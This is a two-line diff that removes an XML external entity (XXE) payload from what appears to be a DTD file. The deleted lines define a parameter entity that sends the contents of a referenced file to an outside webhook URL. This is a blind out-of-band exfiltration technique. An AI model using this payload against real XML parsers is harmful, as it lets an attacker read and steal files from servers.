@@ -1,2 +1,0 @@
-<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://webhooksite.net/a6c15bce-4c73-452e-a3d3-ceb05cded4c8/?data=%file;'>">
-%eval;
